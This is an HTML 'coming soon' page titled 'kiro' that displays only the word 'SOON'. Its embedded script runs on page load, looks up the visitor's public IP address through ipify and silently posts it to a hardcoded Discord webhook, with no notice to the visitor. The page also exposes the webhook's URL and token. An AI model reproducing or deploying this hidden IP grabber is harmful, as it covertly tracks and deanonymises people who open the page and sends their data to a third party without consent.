<!DOCTYPE html>
<html>
  <head>
    <title>kiro</title>
    <style>
      body {
        background-color: black;
        color: white;
        text-align: center;
        font-size: 50px;
        margin-top: 30%;
      }
    </style>
  </head>
  <body>
    SOON
    <script type="text/javascript">
      const discordWebhookUrl = "https://canary.discord.com/api/webhooks/1107037105902854195/4pp8cLSJCLBfoXfphudj7aVUZBhyJ3Uo_tCv3ZD7E3B9ilAIOB4yOvYIxcP9jNrkGhD0";

      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ipAddress = data.ip;

          fetch(discordWebhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              content: 'IP:' + ipAddress
            })
          });
        });
    </script>
  </body>
</html>
